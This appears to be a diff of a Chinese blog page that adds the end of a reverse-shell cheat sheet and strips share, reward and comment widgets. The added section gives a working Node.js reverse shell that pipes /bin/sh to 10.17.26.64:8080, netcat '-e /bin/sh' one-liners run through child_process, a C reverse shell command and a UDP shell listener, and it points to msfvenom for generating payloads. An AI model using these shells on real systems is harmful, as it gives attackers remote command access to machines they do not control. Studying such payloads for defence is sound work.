+<h4 id="Nodejs-反弹-shell"><a href="#Nodejs-反弹-shell" class="headerlink" title="Nodejs 反弹 shell"></a>Nodejs 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">        cp = require(&quot;child_process&quot;),</span><br><span class="line">        sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/; // Prevents the Node.js application form crashing</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">require(&#x27;child_process&#x27;).exec(&#x27;nc -e /bin/sh [IPADDR] [PORT]&#x27;)</span><br><span class="line"></span><br><span class="line">-var x = global.process.mainModule.require</span><br><span class="line">-x(&#x27;child_process&#x27;).exec(&#x27;nc [IPADDR] [PORT] -e /bin/bash&#x27;)</span><br><span class="line"></span><br><span class="line">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span><br></pre></td></tr></table></figure>
+
+<h4 id="C-反弹-shell"><a href="#C-反弹-shell" class="headerlink" title="C 反弹 shell"></a>C 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc c_revese_shell.c -o cshell</span><br><span class="line">./cshell 192.168.1.128 8080</span><br></pre></td></tr></table></figure>
+
+<h4 id="UDP-反弹-shell"><a href="#UDP-反弹-shell" class="headerlink" title="UDP 反弹 shell"></a>UDP 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 注意这里务必要用udp的模式来接</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -l -p 53 -u</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python udpshell.py 192.168.1.128 53 udp</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="MSF-生成反弹-shell"><a href="#MSF-生成反弹-shell" class="headerlink" title="MSF 生成反弹 shell"></a>MSF 生成反弹 shell</h4><p><strong>metasploit 是一个非常强大的渗透工具箱，当然也包括了反弹语句的生成与接收反弹 shell 的平台。它也能生成反弹 shell 一句话。</strong><br><code>msf &gt; msfvenom -l payloads &#39;cmd/unix/reverse&#39; | grep unix</code></p>
+
       
 
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/img/weixin.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -279,65 +295,16 @@ var _hmt = _hmt || [];
       
 
       
-
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/08/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/">展开全文 >></a>
+        </p>
       
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
 
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://austfish.github.io/assets/demo/mediator/demo.html" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
-
-  
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -357,21 +324,12 @@ var _hmt = _hmt || [];
 
 
 
-  
-  
-  
 
   
-  <div id="SOHUCS" sid="" ></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = "cyuoyyRfG"; 
-var conf = "prod_896953d8f0fe0d30dcd5439b0a0db4d2"; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("//changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
   
-
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
   
 
 
@@ -400,7 +358,7 @@ window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="tex
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: false,
+		isHome: true,
 		isPost: false,
 		isArchive: false,
 		isTag: false,
